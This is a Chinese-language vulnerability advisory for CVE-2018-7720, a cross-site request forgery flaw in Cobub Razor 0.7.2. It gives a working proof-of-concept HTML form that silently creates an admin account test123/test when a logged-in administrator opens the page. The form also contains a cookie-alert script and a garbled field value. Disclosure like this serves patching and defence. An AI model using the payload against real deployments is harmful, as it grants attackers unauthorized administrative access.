### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Cobub Razor 0.7.2存在跨站请求伪造漏洞|2018-03-06|Kyhvedn（yinfengwuyueyi@163.com、kyhvedn@5ecurity.cn）|[http://www.cobub.com/](http://www.cobub.com/) | [https://github.com/cobub/razor/](https://github.com/cobub/razor/) |0.7.2 | [CVE-2018-7720](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7720)|  

#### 漏洞概述  

> Cobub Razor 0.7.2存在跨站请求伪造漏洞，管理员登陆后访问特定页面可增加管理员账号。保存如下利用代码为html页面，打开页面将增加test123/test的管理员账号。  

### POC实现代码如下：  

> 利用代码如下：
``` html
<body>
  <script>alert(document.cookie)</script>
    <form action="http://localhost/index.php?/user/createNewUser/" method="POST">
      <input type="hidden" name="username" value="test123" />
      <input type="hidden" name="email" value="test&#64;test123&#46;test" />
      <input type="hidden" name="password" value="test" />
      <input type="hidden" name="confirm&#95;password" value="test" />
      <input type="hidden" name="userrole" value="3" />
      <input type="hidden" name="user&#47;ccreateNewUser" value="�&#136;&#155;�&#187;�" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```